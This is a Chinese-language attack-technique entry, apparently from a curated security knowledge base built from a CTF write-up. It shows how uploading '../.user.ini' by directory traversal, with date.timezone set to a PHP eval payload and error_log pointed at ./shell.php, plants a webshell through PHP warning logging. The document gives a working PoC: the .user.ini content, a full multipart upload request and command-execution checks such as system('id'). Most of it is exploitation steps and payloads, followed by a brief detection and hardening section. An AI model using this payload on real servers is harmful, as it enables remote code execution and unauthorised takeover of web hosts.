---
id: web-php-file-inclusion-user-ini-timezone-error-log-webshell
title: .user.ini 时区配置报错写 shell：date.timezone 注入 error_log
type: scenario
domain: web
path: web/php/file-inclusion
technique: user-ini-date-timezone-error-log-webshell
aliases:
- Acc's Blog
- .user.ini
- date.timezone
- 时区配置报错
- error_log 写马
- 上传 ../.user.ini
- 目录穿越上传配置
tags:
- php
- user-ini
- error-log
- log-poisoning
- timezone
- file-upload
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:20:18+08:00'
  notes: 已对照原文与截图核对：../.user.ini、date.timezone 非法值触发 Warning、log_errors=On/html_errors=Off/error_log=./shell.php 写入 shell、访问 shell.php 执行均一致；原文为 CTF 环境无组件版本；未实际运行 PoC。
---

## 一句话结论

当上传接口允许把文件写到上级目录（如 `../.user.ini`）且目标页面会调用 `date()` 等时间函数时，把 `date.timezone` 设为包含 `<?php ... ?>` 的非法值，并同时设置 `log_errors=On`、`html_errors=Off`、`error_log=./shell.php`；PHP 在时间函数报错时会把时区值原样写进 `shell.php`，访问该文件即可执行代码。

## 原理

- **`.user.ini` 可设置时区**：`date.timezone` 属于 `PHP_INI_ALL`/`PHP_INI_PERDIR` 级别，PHP-FPM/CGI 会按目录读取 `.user.ini` 并应用；攻击者若能上传 `.user.ini`（包括通过 `../` 写到上级目录），就能控制该目录下 PHP 的运行配置。
- **非法时区触发 Warning**：把 `date.timezone` 设为不符合时区格式的字符串后，页面调用 `date()`、`time()`、`strtotime()` 等时间函数时，PHP 会产生 `Warning: date(): Invalid date.timezone value '...'`，且该 Warning 不会杀死进程。
- **报错内容包含配置值**：Warning 文本会原样拼接 `date.timezone` 的值；把值设为 `"<?php @eval($_POST['cmd']);?>"`，payload 就随 Warning 写入日志。
- **写入 Web 目录**：`error_log = ./shell.php` 把日志路径指向当前目录下的 `shell.php`；目录可写且文件不存在时 PHP 会创建它。`html_errors = Off` 必须设置，否则 `<`、`>` 会被 HTML 转义成 `&lt;`/`&gt;`，写出的 PHP 代码无法执行。
- **为什么选时区**：相比 `session.save_path`/`include_path` 等配置，`date.timezone` 的报错只依赖一次普通时间函数调用，不需要开启 Session 或制造包含失败；只要目标页面有 `date()` 等调用即可触发，条件更宽松。
- 成立前提是“可写 `.user.ini` + 目录可写 + 页面调用时间函数 + `html_errors` 可关闭”，四者缺一不可。

## 触发条件

- 上传/写文件接口允许目录穿越（如 `../.user.ini`）或可直接写 Web 目录下的 `.user.ini`。
- 目标目录使用 PHP-FPM/CGI（`.user.ini` 生效），且 `date.timezone` 未被 `php_admin_value` 锁定。
- 目标 PHP 页面会调用 `date()`、`time()`、`strtotime()` 等时间函数（登录页、日志页、缓存页常见）。
- `error_log` 指向的目录对 PHP 运行用户可写，且该路径可通过 Web 访问。
- `html_errors` 可被 `.user.ini` 关闭（默认开启会转义尖括号）。

## 利用步骤

1. 先上传 `../.user.ini`，内容为 `date.timezone = "Invalid/Timezone"`，访问目标页面确认出现时间相关 Warning（验证 `.user.ini` 生效且页面调用时间函数）。
2. 替换为完整 payload：开启错误日志、关闭 HTML 转义、把 `error_log` 指向 `./shell.php`、把 `date.timezone` 设为包含 PHP 代码的非法值。
3. 访问会调用时间函数的页面，触发 Warning；PHP 把包含 payload 的 Warning 写入 `shell.php`。
4. 访问 `./shell.php`，POST `cmd=phpinfo();` 或 `cmd=system('id');` 验证执行。
5. 若 `shell.php` 内容被追加多次/包含额外文本，用 `@eval` 或 `assert` 形式仍可执行；必要时调整 `error_log` 路径或重复触发。

## PoC

`.user.ini`：

```ini
log_errors = On
html_errors = Off
error_log = ./shell.php
date.timezone = "<?php @eval($_POST['cmd']);?>"
```

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="../.user.ini"
Content-Type: text/plain

log_errors = On
html_errors = Off
error_log = ./shell.php
date.timezone = "<?php @eval($_POST['cmd']);?>"
------x--
```

```text
# 触发：访问任意调用 date() 的页面，PHP 产生 Warning：
# Warning: date(): Invalid date.timezone value '<?php @eval($_POST['cmd']);?>' ...
# 该行被写入 ./shell.php
# 然后 POST /shell.php  cmd=phpinfo();
```

## 变体与关联

- 配置项变体：`session.save_path`、`include_path`、`assert.exception` 等能把可控值带进 Warning 的配置也可用于同类写入；见 [[web-php-file-inclusion-php-error-log-poisoning-webshell]]。
- 触发函数变体：`date()`、`strtotime()`、`mktime()`、`DateTime` 构造等时间函数都可能触发时区 Warning。
- 上传变体：`../.user.ini` 目录穿越、zip-slip、软链接、备份恢复等；若只能写当前目录，也可尝试 `.htaccess`（Apache mod_php）。
- 关联：[[web-php-file-inclusion-user-ini-auto-prepend-rce]]（`.user.ini` auto_prepend_file）、[[web-php-file-inclusion-user-ini-session-save-path-webshell]]（session.save_path 写马）、[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（错误日志投毒通用原理）。

## 检测与防御

- 检测：上传接口出现 `../.user.ini`、`.htaccess` 等配置文件；Web 目录出现 `shell.php` 等新文件；PHP 日志出现 `Invalid date.timezone value` 且值包含 `<?php`；请求中出现 `date.timezone`/`error_log` 配置写入。
- 防御：上传文件使用 `basename`、白名单扩展名与固定目录，禁止 `../`；禁止 Web 目录写入 `.user.ini`/`.htaccess`；`error_log` 指向 Web 根目录之外，且目录不可被 Web 访问。
- 加固：`php_admin_value` 锁定 `date.timezone`、`error_log`、`html_errors` 等关键配置；关闭不必要的上传/写文件功能；监控 Web 目录新增 PHP 文件。
